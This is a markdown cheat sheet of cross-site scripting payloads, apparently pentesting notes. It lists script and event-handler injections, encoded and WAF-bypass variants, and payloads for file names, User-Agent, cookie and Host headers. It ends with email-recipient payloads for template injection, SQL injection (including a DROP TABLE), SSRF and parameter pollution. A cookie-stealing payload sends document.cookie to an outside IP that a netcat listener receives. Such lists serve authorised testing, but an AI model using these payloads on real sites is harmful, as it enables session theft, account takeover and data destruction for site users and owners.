# XSS

Cross-Site Scripting (XSS) useful payload list to know.

## Test Characters

```bash
"
;
<
>
```

## Generic

```bash
<Svg/Onload=1
c5obc'+alert(1)+'p7yd5
<svg onload=alert(1)>
<script>alert(1)</script>
<</p>iframe src=javascript:alert()//
<script>alert('PoC')</script>
"><script>alert('XSS')</script>
"><script>alert(document.domain)</script>
"><img src=x onerror="alert(document.domain)">
<scr ipt>ale rt (1) </scr ipt>
%3cscript>alert('PoC')</script>
%25%33%63script>alert('PoC')</script>
&#x3c;script>alert('PoC')</script>
</script><script>alert(1)</script>
["</script><script>alert(1)</script>"]
<a href="x">test</a>
<img src=x />
<img src=x onerror="alert(1);" />
&#x3c;script>alert(1)&#x3c;/script>
<img src=x onerror="alert(document.cookie);" />
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';><
<a href="javascript:alert('PoC')">Click me</a>
<p><script>alert(1)</script></p>
<i nput type="text" id="search-text" name="query" value="" onfocus="alert(1)" autofocus="" />
draggable=true ondragstart="alert(1)
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
<</div>script</div>>alert()<</div>/script</div>>
"><a href=j<TAB><NEWLINE><TAB><NEWLINE><TAB><NEWLINE>avascript:confirm("payload")>XSSs</a>
```

## Content Injection

In the example below, set up a NetCat listener on port 80 (**sudo nc -nlvp 80**). This listener will receive a connection on success.

```bash
<iframe src=http://10.10.10.10/report height="O" width="O"></iframe>
```

## Cookie Stealing

In the example below, set up a NetCat listener on port 80 sudo nc -nlvp 80. This listener will receive a connection on success.

```bash
<script>new Image().src="http://10.10.10.10/nothinghere.jpg?output="+document.cookie;</script>
```

## WAF Bypass

```bash
%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a
```

## XSS in Filename

```bash
<img src=x onerror=alert('XSS')>.png
"><img src=x onerror=alert('XSS')>.png
"><svg onmouseover=alert(1)>.svg
<<script>alert('xss')<!--a-->a.png
```

## Host Header

```bash
"> <script>alert(1)</script>
```

## Chrome and Firefox

#### Standard

```bash
<script>alert(1)</script>
<a href="javascript:alert(1)">XSS</a>
<a href="JaVaScript:alert(1)">XSS</a>
<iframe src="javascript:alert(1)">
<script src="data:text/javascript,alert(1)"></script>
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg>
```

#### onclick

```bash
<a onclick="alert(1)">test</a>
<body onclick="alert(1)">test</body>
<textarea onclick="alert(1)">test</textarea>
<p onclick="alert(1)">test</p>
<svg onclick="alert(1)">test</svg>
<iframe onclick="alert(1)">test</iframe>
```

#### onmousover

```bash
<a onmouseover="alert(1)">test</a>
<body onmouseover="alert(1)">test</body>
<p onmouseover="alert(1)">test</p>
<svg onmouseover="alert(1)">test</svg>
```

#### onload

```bash
<body onload=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)></iframe>
```

#### onerror

```bash
<image src/onerror=alert(1)>
<img src/onerror=alert(1)>
<script onerror=alert(1) src=/></script>
<body onerror=alert(1) onload=/>
```

## DOM Based

```bash
javascript:alert(¨DOM")
"><script>alert(document.cookie)</script>
alert(1)
alert(document.cookie)
#<script>alert('xss')</script>
```

## User-Agent

```bash
</SCript><svG/onLoad=alert(document.domain)>
```

## XSS in Cookie Header

```bash
Cookie: PHPSESSID=hd<script>alert(document.cookie)</script>np5
```

## Email recipient payloads

#### XSS

```bash
test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com
```

#### Template injection

```bash
"<= 7 * 7 %>"@example.com
test+(${{7*7}} )@example.com
```

#### SQL Injection

```bash
"' OR 1=1 -- '"@example.com
"mail'); DROP TABLE users;--"@example.com
```

#### SSRF

```bash
john.doe@abc123.burpcollaborator.net
john.doe@[127.0.0.1]
```

#### Parameter pollution

```bash
victim&email=attacker@example.com
```

## References

- [Portswigger.net Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)